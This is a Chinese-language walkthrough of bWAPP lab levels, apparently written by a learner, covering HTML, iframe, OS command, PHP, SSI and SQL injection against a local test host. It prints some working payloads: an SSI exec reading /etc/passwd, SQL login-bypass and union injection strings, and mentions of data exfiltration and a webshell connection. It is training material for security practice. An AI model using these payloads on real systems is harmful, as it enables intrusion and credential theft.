HTML Injection - Reflected (GET)

输入的内容会直接回显到页面上，可以修改页面的dom或者执行js命令

或者可以直接构造一个表单，诱骗用户登录

在攻击机上监听

后面的内容就只会简单的验证一下可以利用，不会再构造表单。

HTML Injection - Reflected (POST)

第二关跟第一关区别不大，只改了传参方式。

注入方式一样

HTML Injection - Reflected (URL)

这一关中url会直接输出到页面中。注入点直接就是url，类似于GET。

但是经过测试发现通过hackbar或者地址栏直接注入，特殊符号会被url编码。

所以需要通过burp修改一下数据包

将被编码的参数解码。

成功注入

HTML Injection - Stored (Blog)

这关是一个留言板

同样内容会被直接输出到页面中，直接输入注入的代码就行了

iFrame Injection

这关要观察一下url中的参数

http://192.168.0.176/bWAPP/iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250

和页面中源码的关系

可以看到iframe标签中的参数是可以直接控制的。

添加一个onload参数，造成xss

OS Command Injection

这关直接看一下源码

调用了shell_exec函数，通过shell环境执行命令。造成了命令执行漏洞。

可以看到，执行了注入的命令。

OS Command Injection - Blind

这关可以从源码中看到，只会执行命令，但是不会回显。也就是我们不知道命令执行的结果。

所以要通过数据外带的方式查看执行的结果。

在攻击机上监听

PHP Code Injection

看一下源码

直接就是一个一句话木马。

或者用蚁剑连接

注意要设置cookie

Server-Side Includes (SSI) Injection

这一关用了SSI，即在html中通过注释，调用命令或指针。

所以传的两个参数都是注入点，命令：<!--#exec cmd="cat /etc/passwd" -->

SQL Injection (GET/Search)

简单的sql注入

title=1%' or '1'='1'-- &action=search

SQL Injection (GET/Select)

每一个选项对应一个movie的值

同样的注入

SQL Injection (POST/Search)

只是请求方式变了，不说了

SQL Injection (POST/Select)

SQL Injection (AJAX/JSON/jQuery)

通过源码可以看到触发keyup事件的时候，会通过ajax，向sqli_10-2.php发出请求。

直接用burp抓包

注意url需要编码。

SQL Injection (CAPTCHA)

只多了一个验证码，别的一样

http://192.168.0.176/bWAPP/sqli_9.php?title=1%'-- &action=search

SQL Injection (Login Form/Hero)

一个登陆框，用万能密码即可

login=1’ or ‘1’=’1’ # &password=2&form=submit

SQL Injection (Login Form/User)

这里登陆的逻辑是将通过用户名查询出的密码，与用户输入的密码通过sha1加密后的值进行比较。

所以我们需要现在正确的密码进行sha1加密。

6885858486f31043e5839c735d99457f045affd0

然后通过联合注入，测试出密码所在的位置

可以看到，密码字段的位置是第三个，2和5回回显出来。可以继续通过2和5进行注入
